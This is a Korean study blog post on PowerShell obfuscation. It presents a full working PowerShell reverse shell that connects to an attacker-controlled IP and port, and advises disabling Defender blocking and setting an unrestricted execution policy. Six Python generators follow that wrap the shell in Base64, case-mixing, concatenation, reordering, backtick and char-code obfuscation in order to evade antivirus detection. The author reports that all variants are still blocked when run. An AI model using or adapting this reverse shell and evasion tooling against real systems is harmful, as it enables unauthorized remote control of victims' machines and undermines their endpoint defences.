---
title: '[Study] PowerShell Obfuscation'
date: 2025-09-02 00:00:00
categories: [Study, Windows]
tags: []
published: True
---

# #Intro

공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 알아보았다.

<br>

<br>

# #Reverse Shell in PowerShell

![image](/assets/posts/250902-2.png){: width="300" }

우선, 공격자 머신에서 nc 명령어로 리스닝을 수행하였다.

<br>

[https://www.revshells.com](https://www.revshells.com)

그 다음, 위의 사이트를 통해 공격자 머신의 IP 주소와 Port 번호를 값으로 하는 PowerShell의 리버스 셸 코드를 얻을 수 있었다.

```powershell
$LHOST = '192.168.195.20';
$LPORT = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024;
while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
    };

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
        $StreamWriter.Write("$Output`n");
        $Code = $null
    }
};
$TCPClient.Close();
$NetworkStream.Close();
$StreamReader.Close();
$StreamWriter.Close()
```

<br>

![image](/assets/posts/250902-1.png)

해당 코드를 Windows PowerShell ISE로 편집하여 저장하고, 리스닝 중인 공격자 머신의 IP 주소와 Port를 인자로 하여 리버스 셸 접속을 시도하였다.

<br>

> 이때, Windows Defender와 같은 보안 솔루션이 실행 중이라면, PowerShell 스크립트 실행이 차단될 수 있다. 이 경우에는 해당 솔루션에서 예외 처리를 해주어야 한다. (실습 환경에서는 Windows Defender가 실행 중이다.) 또한, PowerShell의 실행 정책이 제한적이라면, 아래 명령어로 프로세스 범위에서 실행 정책을 변경해주어야 한다.
> ```powershell
> Set-ExecutionPolicy Unrestricted
> ```

<br>

![image](/assets/posts/250902-3.png)

![image](/assets/posts/250902-4.png)

정상적으로 리스닝 중인 공격자 머신에서 PowerShell이 연결되는 것을 확인할 수 있다. 이제 해당 코드를 입력으로 하여 다양한 방법으로 난독화할 수 있는 python 스크립트를 작성해보고, 이를 통해 생성된 난독화된 PowerShell 코드를 실행하여 Windows Defender가 이를 탐지하는지 확인해보았다.

<br>

<br>

# #Obfuscation

## Base64 Encoding

리버스 셸 코드에 Base64 인코딩을 적용하고, 이를 PowerShell에서 제공하는 Base64 복호화 기능을 이용하여 복원한 후, `Invoke-Expression`을 통해 평가되어 실행될 수 있도록 하는 방법이다.

```python
# base64_.py
import base64


def base64_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    b64 = base64.b64encode(revshell_code.encode('utf-8')).decode('utf-8')
    new_revshell = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}")) | Invoke-Expression'

    return new_revshell

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        new_revshell = base64_obfuscation(revshell_code)

        print(new_revshell)

        with open('revshell.ps1', 'w') as file:
            file.write(new_revshell)
```

<br>

코드를 실행하여 .ps1 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>

<br>

## Random Case

대소문자에 변화를 주는 난독화 방법이다. 예를 들어, `ReVeRsEsHeLl`과 같이 대소문자를 섞어서 작성하는 방법이다.

<br>

```python
# random_case.py

def random_case_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace(' ', '')
    revshell_code = revshell_code.lower()

    new_revshell = ""
    for index, char in enumerate(revshell_code):
        if index % 2 == 0:
            new_revshell += char.upper()
        else:
            new_revshell += char

    return new_revshell

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        new_revshell = random_case_obfuscation(revshell_code)

        print(new_revshell)

        with open('revshell.ps1', 'w') as file:
            file.write(new_revshell)
```

위의 코드로 대소문자가 섞인 난독화된 PowerShell Reverse Shell 코드를 생성할 수 있다. 그러나 이 방법도 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

## Division/Whitespace

PowerShell에서 `'String' + 'String'` 형태로 문자열을 결합할 수 있고, 이를 이용하여 난독화된 코드를 생성할 수 있다. PowerShell에서 문자들이 결합하여 문자열을 이룰 수 있도록 싱글 쿼터와 더블 쿼터를 모두 하나로 맞춰주고, 문자열이 결합된 후에 이 식이 평가되어 실행될 수 있도록 `Invoke-Expression`을 이용한다.

<br>

```python
# division.py

def division_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace(' ', '')
    revshell_code = revshell_code.replace("'", '"')

    new_revshell = '$str='
    for index, char in enumerate(revshell_code):

        if index % 3 == 0:
            new_revshell += f"'{char}"
        elif index % 3 == 1:
            new_revshell += f"{char}'"
        else:
            new_revshell += f"+'{char}'+"

    if new_revshell.endswith("+"):
        new_revshell = new_revshell[:-1]

    new_revshell += ';Invoke-Expression $str'

    return new_revshell


if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        new_revshell = division_obfuscation(revshell_code)

        print(new_revshell)

        with open('revshell.ps1', 'w') as file:
            file.write(new_revshell)
```

<br>

![image](/assets/posts/250902-5.png)

해당 코드를 실행하면, 이번에는 Windows Defender에 의해 차단되지 않고 정상적으로 .ps1 파일이 생성되는 것을 확인할 수 있다.

<br>

![image](/assets/posts/250902-6.png)

그러나, 생성된 .ps1 파일을 실행하면, 위와 같이 Windows Defender가 차단하는 것을 확인할 수 있다. 이는 이전 난독화 기법에서 파일 내의 코드 혹은 시그니처를 기반으로 악성코드를 탐지하는 것과 다르게, 파일 실행 시 동작하는 행위를 기반으로 악성코드를 탐지하는 것을 알 수 있다.

<br>
<br>

## Reorder

코드 문자열의 문자들을 섞음으로써 난독화된 코드를 생성할 수 있고, 이를 실행할 때에는 PowerShell에서 제공하는 `-f` 옵션을 통해 포맷팅된 문자열을 복원하여 사용할 수 있다. 포맷팅된 문자열은 `Invoke-Expression`을 통해 평가되어 실행될 수 있다.

<br>

```python
# reorder.py

import random

revshell_code = ''
with open('revshell.txt', 'r') as file:
    revshell_code = file.read()

revshell_code = revshell_code.replace('\n', '')
revshell_code = revshell_code.replace('\r', '')
revshell_code = revshell_code.replace(' ', '')
revshell_code = revshell_code.replace("'", '"')

indexed_chars = list(enumerate(revshell_code))
random.shuffle(indexed_chars)
new_chars = [(new_index, (old_index, char)) for new_index, (old_index, char) in enumerate(indexed_chars)]
new_chars_sorted = sorted(new_chars, key=lambda x: x[1][0])

shuffled_string = ''.join([f"'{char}'," for index, char in indexed_chars])
shuffled_string = shuffled_string[:-1]

shuffled_index = ''.join([f'{{{new_index}}}' for new_index, (old_index, char) in new_chars_sorted])
shuffled_index = "'" + shuffled_index + "'"

new_revshell = f'$str={shuffled_index}-f{shuffled_string};Invoke-Expression $str'

print(new_revshell)

with open('revshell.ps1', 'w') as file:
    file.write(new_revshell)
```

<br>

![image](/assets/posts/250902-7.png)

`Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, .ps1 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>


## Back Ticks

PowerShell에서 백틱(``` ` ```)은 이스케이프 문자로 사용되며, 이를 이용하여 난독화된 코드를 생성할 수 있다. 백틱을 이용하여 코드 내의 특수 문자를 이스케이프 처리함으로써, 코드가 정상적으로 평가되어 실행될 수 있도록 한다. 기본적인 셸 코드에 구조 상 backtick을 추가하기에 어려움이 있어, base64 인코딩을 거친 후에 backtick을 추가하는 방식으로 스크립트를 구성하였다.

<br>

```python
# back_ticks.py

import base64
import string

import base64_


def back_ticks_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    new_revshell = ''
    flag = False
    for char in revshell_code:
        if char not in ['"', 'n', 't', 'r', ' '] and char in string.ascii_letters:
            new_revshell += '`' + char
            flag = True
        else:
            if flag:
                new_revshell += '`' + char
                flag = False
            else:
                new_revshell += char

    if new_revshell[0] == '`':
        new_revshell = new_revshell[1:]

    new_revshell = f"$str='{new_revshell}';Invoke-Expression $str"

    return new_revshell


if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        base64_revshell = base64.b64encode(revshell_code.encode()).decode()

        new_revshell = back_ticks_obfuscation(base64_revshell)

        print(new_revshell)

        with open('revshell.ps1', 'w') as file:
            file.write(new_revshell)
```

<br>

생성된 .ps1 파일은 backtick이 추가되었음에도 불구하고 여전히 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

## Ascii char assigns

PowerShell에서는 `[char]ascii_code` 형식으로 ASCII 문자를 표현할 수 있다. 예를 들어, `[char]65`는 'A'를 의미한다. 이를 활용하여 난독화된 코드를 생성할 수 있다.

<br>

```python
def ascii_char_assigns_obfuscation(revshell_code):

    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    new_revshell = ''
    for char in revshell_code:
        new_revshell += f"[char]{ord(char)}+"

    if new_revshell.endswith('+'):
        new_revshell = new_revshell[:-1]

    new_revshell = f"$str={new_revshell};Invoke-Expression $str"

    return new_revshell

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        new_revshell = ascii_char_assigns_obfuscation(revshell_code)

        print(new_revshell)

        with open('revshell.ps1', 'w') as file:
            file.write(new_revshell)
```

<br>

스크립트를 실행하면 .ps1 파일은 정상적으로 생성되는 것을 확인할 수 있으나, 실행 시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

> **Reference**
>
> [https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/](https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/)
{: .prompt-info }
